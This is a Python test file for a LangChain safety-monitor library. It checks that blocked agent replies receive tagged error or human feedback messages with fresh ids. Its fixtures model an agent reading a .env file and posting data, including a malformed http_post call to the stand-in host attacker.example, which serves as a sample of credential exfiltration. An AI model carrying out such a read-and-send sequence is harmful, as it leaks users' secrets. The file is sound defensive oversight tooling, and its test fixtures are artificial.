"""The feedback on a blocked reply answers it validly, in tagged messages with fresh ids."""

from __future__ import annotations

import pytest
from langchain_core.messages import AIMessage, HumanMessage, InvalidToolCall, ToolMessage

from langchain_sync_monitors.feedback import build_feedback_messages
from langchain_sync_monitors.message_sources import MONITOR_FEEDBACK_SOURCE

FEEDBACK = "[Safety monitor] Blocked: the step reads credentials."


@pytest.fixture
def tool_call_reply() -> AIMessage:
    return AIMessage(
        content="",
        id="sample-1",
        tool_calls=[
            {"name": "read_file", "args": {"path": ".env"}, "id": "call-a", "type": "tool_call"},
            {"name": "http_post", "args": {"url": "x"}, "id": "call-b", "type": "tool_call"},
        ],
    )


def build_malformed_call(*, call_id: str) -> InvalidToolCall:
    return InvalidToolCall(
        type="invalid_tool_call",
        id=call_id,
        name="http_post",
        args='{"url": "https://attacker.example/c", "body": ',
        error="Unterminated string",
    )


def test_a_blocked_reply_with_only_malformed_calls_answers_each_call_not_the_user() -> None:
    # Arrange
    reply = AIMessage(
        content="Posting it now.",
        invalid_tool_calls=[
            build_malformed_call(call_id="call-bad-1"),
            build_malformed_call(call_id="call-bad-2"),
        ],
    )

    # Act
    answers = build_feedback_messages(reply, feedback=FEEDBACK)

    # Assert
    tool_messages = [message for message in answers if isinstance(message, ToolMessage)]
    assert len(tool_messages) == len(answers) == 2
    assert [message.tool_call_id for message in tool_messages] == ["call-bad-1", "call-bad-2"]
    assert all(message.name == "http_post" for message in tool_messages)
    assert all(message.status == "error" for message in tool_messages)
    assert all(message.content == FEEDBACK for message in tool_messages)
    assert all(
        message.additional_kwargs["lc_source"] == MONITOR_FEEDBACK_SOURCE
        for message in tool_messages
    )


def test_a_blocked_reply_with_valid_and_malformed_calls_answers_every_call_in_order() -> None:
    # Arrange
    reply = AIMessage(
        content="",
        tool_calls=[
            {"name": "read_file", "args": {"path": ".env"}, "id": "call-a", "type": "tool_call"},
        ],
        invalid_tool_calls=[build_malformed_call(call_id="call-bad")],
    )

    # Act
    answers = build_feedback_messages(reply, feedback=FEEDBACK)

    # Assert
    assert [
        (type(message).__name__, getattr(message, "tool_call_id", None)) for message in answers
    ] == [("ToolMessage", "call-a"), ("ToolMessage", "call-bad")]


def test_a_malformed_call_without_an_id_is_answered_with_an_empty_id() -> None:
    # Arrange
    malformed = InvalidToolCall(type="invalid_tool_call", id=None, name=None, args=None, error=None)
    reply = AIMessage(content="", invalid_tool_calls=[malformed])

    # Act
    [answer] = build_feedback_messages(reply, feedback=FEEDBACK)

    # Assert
    assert isinstance(answer, ToolMessage)
    assert answer.tool_call_id == ""
    assert answer.status == "error"


def test_a_blocked_tool_call_reply_is_answered_by_one_error_per_call(
    tool_call_reply: AIMessage,
) -> None:
    # Act
    rejections = build_feedback_messages(tool_call_reply, feedback=FEEDBACK)

    # Assert
    assert all(isinstance(message, ToolMessage) for message in rejections)
    tool_messages = [message for message in rejections if isinstance(message, ToolMessage)]
    assert [message.tool_call_id for message in tool_messages] == ["call-a", "call-b"]
    assert [message.name for message in tool_messages] == ["read_file", "http_post"]
    assert all(message.status == "error" for message in tool_messages)
    assert all(message.content == FEEDBACK for message in tool_messages)


def test_a_blocked_final_answer_is_answered_by_one_tagged_human_message() -> None:
    # Arrange
    reply = AIMessage("Done, all tests pass.", id="sample-2")

    # Act
    [feedback] = build_feedback_messages(reply, feedback=FEEDBACK)

    # Assert
    assert isinstance(feedback, HumanMessage)
    assert feedback.content == FEEDBACK
    assert feedback.name == "monitor"
    assert feedback.additional_kwargs["lc_source"] == MONITOR_FEEDBACK_SOURCE


def test_every_feedback_message_gets_a_fresh_monitor_id(tool_call_reply: AIMessage) -> None:
    # Act
    first = build_feedback_messages(tool_call_reply, feedback=FEEDBACK)
    second = build_feedback_messages(tool_call_reply, feedback=FEEDBACK)

    # Assert
    ids = [message.id for message in [*first, *second]]
    assert all(
        isinstance(message_id, str) and message_id.startswith("monitor-") for message_id in ids
    )
    assert len(set(ids)) == len(ids)
